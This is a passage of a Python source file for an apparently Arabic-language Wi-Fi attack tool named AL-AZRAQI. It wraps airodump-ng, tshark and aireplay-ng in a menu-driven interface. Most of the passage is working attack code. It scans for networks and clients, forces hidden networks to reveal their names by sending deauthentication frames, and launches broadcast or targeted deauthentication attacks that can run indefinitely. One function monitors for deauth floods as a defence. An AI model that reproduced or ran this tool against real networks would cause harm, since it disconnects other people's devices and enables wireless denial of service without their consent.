        title="👥 الأجهزة المرصودة",
        box=box.ROUNDED,
        border_style="bright_green",
        title_style="bold bright_cyan",
        show_lines=True
    )
    table.add_column("#", style="bold bright_yellow", justify="center", width=4)
    table.add_column("Client MAC", style="bright_cyan", width=18)
    table.add_column("BSSID المرتبط", style="bright_magenta", width=18)
    table.add_column("الإشارة", justify="center", width=22)
    table.add_column("الحزم", justify="center", width=8)

    for i, cli in enumerate(clients, 1):
        avg = cli.power_avg
        label, style = classify_signal(avg)
        power_str = f"[{style}]{avg} dBm ({label})[/{style}]" if avg is not None else "[dim]غير متاح[/dim]"

        bssid_display = cli.bssid if cli.bssid and cli.bssid != "(not associated)" else "[dim]غير مرتبط[/dim]"

        table.add_row(str(i), cli.mac, bssid_display, power_str, str(cli.packets))

    console.print(table)


def reveal_hidden_ssid_auto(interface: str, bssid: str, channel: str, duration: int = 20) -> Optional[str]:
    console.print(Panel(
        f"[bold bright_cyan]🔓 محاولة كشف اسم الشبكة المخفية[/bold bright_cyan]\n"
        f"[bright_yellow]BSSID:[/bright_yellow] {bssid} | [bright_yellow]Channel:[/bright_yellow] {channel}\n"
        "[dim]💡 سيتم إرسال حزم استطلاع لإجبار الراوتر على الرد بالاسم...[/dim]",
        title="[bold bright_magenta]🔓 كشف ذكي[/bold bright_magenta]",
        border_style="bright_cyan"))

    try:
        subprocess.run(["iwconfig", interface, "channel", channel], 
                      capture_output=True, timeout=3)
    except:
        pass

    revealed_ssid = None
    deauth_proc = None
    tshark_proc = None

    try:
        tshark_cmd = [
            "tshark", "-i", interface,
            "-f", f"wlan bssid {bssid}",
            "-Y", "wlan.ssid && wlan.fc.type == 0 && wlan.fc.subtype == 5",
            "-T", "fields", "-e", "wlan.ssid", "-c", "1"
        ]
        
        tshark_proc = subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, bufsize=1)
        _active_processes.append(tshark_proc)

        deauth_cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, interface]
        deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _active_processes.append(deauth_proc)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40),
            TimeElapsedColumn(),
            console=console,
            transient=True
        ) as progress:
            task = progress.add_task("[bright_cyan]جاري إجبار الراوتر على الكشف...", total=duration)
            start = time.time()
            
            while time.time() - start < duration:
                if tshark_proc.poll() is not None:
                    break
                    
                try:
                    line = tshark_proc.stdout.readline()
                    if line:
                        decoded = line.decode("utf-8", errors="replace").strip()
                        if decoded and len(decoded) > 2:
                            revealed_ssid = decoded
                            break
                except:
                    pass
                    
                progress.update(task, completed=time.time() - start)
                time.sleep(0.5)

    except Exception as e:
        console.print(f"[bold red]✖ خطأ أثناء الكشف: {e}[/bold red]")
    finally:
        if deauth_proc:
            terminate_process(deauth_proc)
            if deauth_proc in _active_processes: _active_processes.remove(deauth_proc)
            
        if tshark_proc:
            terminate_process(tshark_proc)
            if tshark_proc in _active_processes: _active_processes.remove(tshark_proc)

    if revealed_ssid:
        console.print(Panel(
            f"[bold bright_green]✔ تم كشف اسم الشبكة بنجاح:[/bold bright_green]\n"
            f"[bold bright_cyan]📶 {revealed_ssid}[/bold bright_cyan]",
            title="[bold bright_green]✅ نجاح[/bold bright_green]", border_style="bright_green"))
        return revealed_ssid
    else:
        console.print(Panel(
            "[bold bright_yellow]⚠ لم يتم كشف الاسم خلال الفترة المحددة[/bold bright_yellow]\n"
            "[dim]💡 قد يكون الراوتر بعيداً جداً، أو لا يوجد أجهزة متصلة به حالياً.[/dim]",
            border_style="bright_yellow"))
        return None


def monitor_deauth(interface: str, duration: int = 30) -> List[DeauthEvent]:
    if not shutil.which("tshark"):
        console.print(Panel(
            "[bold bright_yellow]⚠ tshark غير مثبت[/bold bright_yellow]",
            border_style="bright_yellow"))
        return []

    console.print(Panel(
        f"[bold bright_cyan]🛡 المراقبة الدفاعية على [bold]{interface}[/bold][/bold bright_cyan]\n"
        f"[bright_yellow]المدة: {duration} ثانية[/bright_yellow]",
        title="[bold bright_magenta]🛡 مراقبة دفاعية[/bold bright_magenta]",
        border_style="bright_cyan"))

    cmd = [
        "tshark", "-i", interface,
        "-Y", "wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10",
        "-T", "fields",
        "-e", "frame.time", "-e", "wlan.sa", "-e", "wlan.da",
        "-e", "wlan.bssid", "-e", "wlan.fc.type_subtype",
        "-E", "separator=,"
    ]

    events: List[DeauthEvent] = []
    start_time = time.time()
    proc = None

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, bufsize=1)
        _active_processes.append(proc)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            console=console,
            transient=True
        ) as progress:
            task = progress.add_task("[bright_cyan]جاري الرصد...", total=duration)

            while time.time() - start_time < duration:
                if proc.poll() is not None:
                    break
                line = proc.stdout.readline()
                if line:
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.split(",")
                    if len(parts) >= 5:
                        frame_type = "Deauth" if parts[4].strip() == "12" else "Disassoc"
                        events.append(DeauthEvent(
                            timestamp=parts[0], source=parts[1],
                            destination=parts[2], bssid=parts[3],
                            frame_type=frame_type
                        ))

                elapsed = time.time() - start_time
                progress.update(task, completed=min(elapsed, duration))
                time.sleep(0.1)

        terminate_process(proc)
        if proc in _active_processes:
            _active_processes.remove(proc)

    except Exception as e:
        console.print(f"[bold red]✖ خطأ: {e}[/bold red]")

    display_deauth_report(events, duration)
    return events


def display_deauth_report(events: List[DeauthEvent], duration: int):
    console.print()

    if not events:
        console.print(Panel(
            "[bold bright_green]✔ لم يتم رصد أي إطارات Deauth/Disassoc[/bold bright_green]\n"
            "[dim]💡 قد تكون على قناة مختلفة، أو مخفية بسبب PMF.[/dim]",
            title="[bold bright_green]✅ نتيجة المراقبة[/bold bright_green]", border_style="bright_green"))
        return

    source_counts: Dict[str, int] = defaultdict(int)
    for ev in events:
        source_counts[ev.source] += 1

    table = Table(
        title="🛡 إطارات Deauth/Disassoc المرصودة",
        box=box.ROUNDED, border_style="bright_red", title_style="bold bright_red", show_lines=True
    )
    table.add_column("الوقت", style="bright_cyan", width=12)
    table.add_column("المصدر", style="bright_yellow", width=18)
    table.add_column("الوجهة", style="bright_magenta", width=18)
    table.add_column("BSSID", style="bright_blue", width=18)
    table.add_column("النوع", justify="center", width=10)

    for ev in events[-20:]:
        color = "bright_red" if ev.frame_type == "Deauth" else "bright_yellow"
        ts = ev.timestamp[-12:] if len(ev.timestamp) > 12 else ev.timestamp
        table.add_row(ts, ev.source, ev.destination, ev.bssid, f"[{color}]{ev.frame_type}[/{color}]")

    console.print(table)

    total = len(events)
    rate = total / max(duration, 1)

    summary = Table(box=box.SIMPLE, border_style="bright_cyan")
    summary.add_column("المقياس", style="bold bright_cyan")
    summary.add_column("القيمة", style="bold bright_green")
    summary.add_row("إجمالي الإطارات", str(total))
    summary.add_row("المعدل (إطار/ثانية)", f"{rate:.2f}")
    summary.add_row("مصادر فريدة", str(len(source_counts)))

    console.print(Panel(summary, title="[bold bright_magenta]📊 ملخص[/bold bright_magenta]", border_style="bright_magenta"))

    if rate > 5:
        console.print(Panel(
            f"[bold bright_red]⚠ تنبيه: معدل مرتفع ({rate:.1f} إطار/ثانية) قد يشير إلى هجوم[/bold bright_red]",
            title="[bold bright_red]🚨 تنبيه أمني[/bold bright_red]", border_style="bright_red"))


def execute_deauth(interface: str, bssid: str, channel: str,
                   target_type: str, target_mac: str,
                   duration: int, duration_label: str) -> Tuple[bool, str]:
    console.print(Panel(
        f"[bold bright_cyan]🎯 الهدف:[/bold bright_cyan] {bssid}\n"
        f"[bold bright_cyan]📡 القناة:[/bold bright_cyan] {channel}\n"
        f"[bold bright_cyan]👤 النوع:[/bold bright_cyan] {target_type}\n"
        f"[bold bright_cyan]🔗 MAC:[/bold bright_cyan] {target_mac}\n"
        f"[bold bright_cyan]⏱ المدة:[/bold bright_cyan] {duration_label}",
        title="[bold bright_magenta]⚔ إعدادات الهجوم[/bold bright_magenta]",
        border_style="bright_magenta"))

    console.print("[bright_yellow]⚙ جاري ضبط القناة...[/bright_yellow]")
    rc, _, err = safe_run_cmd(["iwconfig", interface, "channel", channel])
    if rc != 0:
        console.print(f"[bright_yellow]⚠ تعذر ضبط القناة: {err}[/bright_yellow]")

    cmd = ["aireplay-ng", "--deauth"]
    if duration > 0:
        cmd.append(str(duration * 10))
    else:
        cmd.append("0")
    cmd.extend(["-a", bssid, interface])
    if target_type == "client":
        cmd.extend(["-c", target_mac])

    console.print(f"[dim]الأمر: {' '.join(cmd)}[/dim]\n")

    proc = None
    success = False
    error_msg = ""
    deauth_count = 0

    try:
        if duration > 0:
            with Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=40),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
                console=console
            ) as progress:
                task = progress.add_task("[bold bright_red]⚔ جاري التنفيذ...[/bold bright_red]", total=duration)
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                _active_processes.append(proc)

                start = time.time()
                while time.time() - start < duration:
                    if proc.poll() is not None:
                        break
                    line = proc.stdout.readline()
                    if line and "Sending" in line:
                        deauth_count += 1
                    progress.update(task, completed=min(time.time() - start, duration))
                    time.sleep(0.1)

                terminate_process(proc)
                if proc in _active_processes:
                    _active_processes.remove(proc)

                success = deauth_count > 0
                if not success:
                    error_msg = "لم يتم إرسال أي حزمة Deauth"
        else:
            console.print("[bold bright_yellow]⚔ الهجوم مستمر... Ctrl+C للإيقاف[/bold bright_yellow]")
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            _active_processes.append(proc)

            try:
                while True:
                    if proc.poll() is not None:
                        break
                    line = proc.stdout.readline()
                    if not line:
                        time.sleep(0.1)
                        continue
                    if "Sending" in line or "DeAuth" in line:
                        deauth_count += 1
                        console.print(f"[bright_green]{line.strip()}[/bright_green]")
                    time.sleep(0.05)
            except KeyboardInterrupt:
                pass
            finally:
                terminate_process(proc)
                if proc in _active_processes:
                    _active_processes.remove(proc)

            success = deauth_count > 0
            if not success:
                error_msg = "لم يتم إرسال أي حزمة Deauth"

    except FileNotFoundError:
        error_msg = "aireplay-ng غير موجود"
        console.print(f"[bold red]✖ {error_msg}[/bold red]")
        return False, error_msg
    except Exception as e:
        error_msg = f"خطأ: {e}"
        console.print(f"[bold red]✖ {error_msg}[/bold red]")
        return False, error_msg

    return success, error_msg


def save_report(networks: List[Network], clients: List[Client],
                deauth_events: List[DeauthEvent],
                attack_result: Optional[Dict] = None,
                fmt: str = "json") -> Optional[str]:
    os.makedirs(REPORTS_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    data = {
        "tool": TOOL_NAME, "version": VERSION,
        "timestamp": datetime.now().isoformat(),
        "networks": [
            {"bssid": n.bssid, "ssid": n.ssid, "channel": n.channel,
             "encryption": n.encryption, "hidden": n.hidden,
             "power_avg": n.power_avg, "security_evaluation": evaluate_security(n.encryption)[0]}
            for n in networks
        ],
        "clients": [
            {"mac": c.mac, "bssid": c.bssid, "power_avg": c.power_avg,
             "packets": c.packets, "probes": c.probes}
            for c in clients
        ],
        "deauth_events": [
            {"timestamp": e.timestamp, "source": e.source,
             "destination": e.destination, "bssid": e.bssid, "frame_type": e.frame_type}
            for e in deauth_events
        ],
        "attack_result": attack_result,
        "summary": {
            "total_networks": len(networks),
            "total_clients": len(clients),
            "total_deauth_events": len(deauth_events)
        }
    }

    try:
        if fmt == "json":
            path = os.path.join(REPORTS_DIR, f"report_{timestamp}.json")
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        elif fmt == "csv":
            path = os.path.join(REPORTS_DIR, f"report_{timestamp}.csv")
            with open(path, "w", encoding="utf-8", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Section", "Field1", "Field2", "Field3", "Field4", "Field5"])
                for n in networks:
                    writer.writerow(["Network", n.bssid, n.ssid, n.channel, n.encryption, n.power_avg])
                for c in clients:
                    writer.writerow(["Client", c.mac, c.bssid, c.power_avg, c.packets, c.probes])
        else:
            path = os.path.join(REPORTS_DIR, f"report_{timestamp}.txt")
            with open(path, "w", encoding="utf-8") as f:
                f.write(f"=== {TOOL_NAME} v{VERSION} Report ===\n")
                f.write(f"Timestamp: {data['timestamp']}\n\n")
                f.write(f"--- Networks ({len(networks)}) ---\n")
                for n in networks:
                    f.write(f"  {n.ssid} | {n.bssid} | CH:{n.channel} | {n.encryption} | {n.power_avg}dBm\n")
                f.write(f"\n--- Clients ({len(clients)}) ---\n")
                for c in clients:
                    f.write(f"  {c.mac} | BSSID:{c.bssid} | {c.power_avg}dBm | Pkts:{c.packets}\n")

    except Exception as e:
        console.print(f"[bold red]✖ خطأ في حفظ التقرير: {e}[/bold red]")
        return None

    console.print(Panel(
        f"[bold bright_green]✔ تم حفظ التقرير:[/bold bright_green]\n[bright_cyan]{path}[/bright_cyan]",
        title="[bold bright_green]📄 تقرير محفوظ[/bold bright_green]", border_style="bright_green"))
    return path


def select_network(networks: List[Network]) -> Optional[Network]:
    console.print("\n[bold bright_cyan]أدخل رقم الشبكة المستهدفة:[/bold bright_cyan]")
    while True:
        try:
            idx = int(input(">>> ").strip()) - 1
            if 0 <= idx < len(networks):
                return networks[idx]
            console.print("[bright_red]رقم خارج النطاق[/bright_red]")
        except ValueError:
            console.print("[bright_red]إدخال غير صالح[/bright_red]")


def select_target(clients: List[Client]) -> Tuple[str, str]:
    console.print(Panel(
        "[bold bright_cyan]اختر نوع الهدف:[/bold bright_cyan]\n\n"
        "  [bold bright_green][1][/bold bright_green] 🌐 الشبكة بالكامل (Broadcast)\n"
        "  [bold bright_green][2][/bold bright_green] 📱 جهاز معين (Specific Client)",
        title="[bold bright_magenta]🎯 اختيار الهدف[/bold bright_magenta]", border_style="bright_cyan"))

    while True:
        choice = input(">>> ").strip()
        if choice == "1":
            return "broadcast", "FF:FF:FF:FF:FF:FF"
        elif choice == "2":
            if not clients:
                console.print("[bold bright_red]✖ لا توجد أجهزة[/bold bright_red]")
                return "broadcast", "FF:FF:FF:FF:FF:FF"
            console.print("[bright_cyan]أدخل رقم الجهاز:[/bright_cyan]")
            idx = input(">>> ").strip()
            try:
                i = int(idx) - 1
                if 0 <= i < len(clients):
                    return "client", clients[i].mac
                console.print("[bright_red]رقم غير صالح[/bright_red]")
            except ValueError:
                console.print("[bright_red]إدخال غير صالح[/bright_red]")
        else:
            console.print("[bright_red]خيار غير صالح[/bright_red]")


def select_duration() -> Tuple[int, str]:
    console.print(Panel(
        "[bold bright_cyan]اختر مدة الهجوم:[/bold bright_cyan]\n\n"
        "  [bold bright_green][1][/bold bright_green] ⚡ 1 ثانية\n"
        "  [bold bright_green][2][/bold bright_green] 🕐 5 ثوانٍ\n"
        "  [bold bright_green][3][/bold bright_green] 🔄 مستمر (Ctrl+C)",
        title="[bold bright_magenta]⏱ مدة الهجوم[/bold bright_magenta]", border_style="bright_cyan"))

    while True:
        choice = input(">>> ").strip()
        if choice == "1":
            return 1, "1s"
        elif choice == "2":
            return 5, "5s"
        elif choice == "3":
            return 0, "infinite"
        else:
            console.print("[bright_red]خيار غير صالح[/bright_red]")


def scan_clients_for_network(interface: str, bssid: str, channel: str, duration: int = 8) -> List[Client]:
    temp_dir = create_temp_dir()
    prefix = os.path.join(temp_dir, "clients")
    cmd = ["airodump-ng", "--bssid", bssid, "-c", channel, "--write", prefix, "--output-format", "csv", interface]

    console.print(Panel(
        f"[bold bright_yellow]⏳ جاري فحص الأجهزة المتصلة بـ [bold]{bssid}[/bold]...[/bold bright_yellow]",
        title="[bold bright_magenta]👥 فحص العملاء[/bold bright_magenta]", border_style="bright_yellow"))

    proc = None
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _active_processes.append(proc)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            console=console,
            transient=True
        ) as progress:
            task = progress.add_task("[bright_cyan]جاري المسح...", total=duration)
            for _ in range(duration):
                time.sleep(1)
                progress.update(task, advance=1)

        terminate_process(proc)
        if proc in _active_processes:
            _active_processes.remove(proc)

        csv_file = find_csv_file(prefix)
        if not csv_file:
            console.print("[bold red]✖ لم يتم العثور على ملف النتائج[/bold red]")
            return []

        _, clients = parse_airodump_csv(csv_file)
        return [c for c in clients if c.bssid == bssid or c.bssid == "(not associated)"]

    except Exception as e:
        console.print(f"[bold red]✖ خطأ: {e}[/bold red]")
        return []
    finally:
        if proc and proc.poll() is None:
            terminate_process(proc)


def main_menu():
    console.print(Panel(
        f"[bold bright_green]مرحباً بك في {TOOL_NAME} v{VERSION}[/bold bright_green]\n"
        "[bright_cyan]Cyber HUD Interface Edition[/bright_cyan]",
        border_style="bright_green"))

    base_interface = input("اسم الواجهة (اتركه فارغاً للافتراضي): ").strip()
    if not base_interface:
        base_interface = DEFAULT_INTERFACE

    interface = check_interface(base_interface)
    if not interface:
        console.print("[bold red]✖ تعذر الحصول على واجهة مراقبة[/bold red]")
        return

    logs: List[str] = ["System initialized", f"Interface: {interface}"]

    while True:
        choice = run_dashboard(interface)

        if choice == "scan":
            networks, initial_clients = scan_networks(interface)
            display_networks(networks)
            if networks:
                display_clients(initial_clients)
            logs.append(f"Scan completed: {len(networks)} networks")
            input("\nاضغط Enter للعودة... ")

        elif choice == "reveal":
            console.print("[bold bright_cyan]🔍 جاري مسح جميع الشبكات للبحث عن الأهداف...[/bold bright_cyan]")
            
            networks, _ = scan_networks(interface, duration=15)
            
            if not networks:
                console.print("[bold red]✖ لم يتم العثور على أي شبكات[/bold red]")
            else:
                display_networks(networks)
                
                console.print("\n[bold bright_yellow]أدخل رقم الشبكة التي تريد كشف اسمها:[/bold bright_yellow]")
                try:
                    idx = int(input(">>> ").strip()) - 1
                    
                    if 0 <= idx < len(networks):
                        target = networks[idx]
                        
                        if not target.hidden and target.ssid != "<hidden>":
                            console.print(Panel(
                                f"[bold bright_green]✔ هذه الشبكة ظاهرة بالفعل![/bold bright_green]\n"
                                f"[bold bright_cyan]الاسم: {target.ssid}[/bold bright_cyan]",
                                title="[bold green]✅ معلومات الشبكة[/bold green]",
                                border_style="green"
                            ))
                        else:
                            console.print(f"[bold bright_red]⚠ الشبكة [{target.bssid}] مخفية! جاري الاستطلاع المتقدم...[/bold bright_red]")
                            
                            ssid_name = reveal_hidden_ssid_auto(interface, target.bssid, target.channel)
                            
                            if ssid_name:
                                target.ssid = ssid_name
                                target.hidden = False
                                console.print(f"[dim]💡 تم تحديث بيانات الشبكة في الجلسة الحالية.[/dim]")
                    else:
                        console.print("[bright_red]رقم خارج نطاق الشبكات المكتشفة[/bright_red]")
                        
                except ValueError:
                    console.print("[bright_red]الرجاء إدخال رقم صحيح[/bright_red]")
            
            input("\nاضغط Enter للعودة... ")

        elif choice == "monitor":
            monitor_deauth(interface)
            logs.append("Defense monitor completed")
            input("\nاضغط Enter للعودة... ")

        elif choice == "attack":
            networks, _ = scan_networks(interface)
            if not networks:
                console.print("[bold red]✖ لا توجد شبكات[/bold red]")
            else:
                display_networks(networks)
                target = select_network(networks)
                if target:
                    clients = scan_clients_for_network(interface, target.bssid, target.channel)
                    display_clients(clients)

                    target_type, target_mac = select_target(clients)
                    duration, duration_label = select_duration()

                    success, error_msg = execute_deauth(
                        interface, target.bssid, target.channel,
                        target_type, target_mac, duration, duration_label
                    )

                    if success:
                        console.print(Panel("[bold bright_green]✔ تم الفصل بنجاح![/bold bright_green]", border_style="bright_green"))
                    else:
                        console.print(Panel(f"[bold bright_red]✖ فشل الهجوم[/bold bright_red]\n[dim]{error_msg}[/dim]", border_style="bright_red"))
                    
                    logs.append(f"Attack: {'success' if success else 'failed'}")
            input("\nاضغط Enter للعودة... ")

        elif choice == "reports":
            console.print("[bright_cyan]اختر الصيغة (json/csv/txt):[/bright_cyan]")
            fmt = input(">>> ").strip().lower()
            if fmt not in ("json", "csv", "txt"):
                fmt = "json"
            save_report([], [], [], None, fmt)
            input("\nاضغط Enter للعودة... ")

        elif choice == "exit":
            break


def main():
    try:
        if not check_root():
            sys.exit(1)
        
        ok, missing = check_dependencies()
        if not ok:
            console.print(Panel(
                "[bold bright_red]✖ أدوات مفقودة:[/bold bright_red]\n" +
                "\n".join(f"  • {t}" for t in missing) +
                "\n\n[bright_yellow]sudo apt install aircrack-ng tshark[/bright_yellow]",
                border_style="bright_red"))
            sys.exit(1)

        cinematic_intro()
        main_menu()

    except KeyboardInterrupt:
        console.print("\n[bold bright_yellow]⚠ تم الإيقاف[/bold bright_yellow]")
    except Exception as e:
        console.print(Panel(f"[bold bright_red]✖ خطأ: {e}[/bold bright_red]", border_style="bright_red"))
    finally:
        cleanup()
        console.print("\n[dim]شكراً لاستخدام AL-AZRAQI 🛡[/dim]\n")


if __name__ == "__main__":
    main()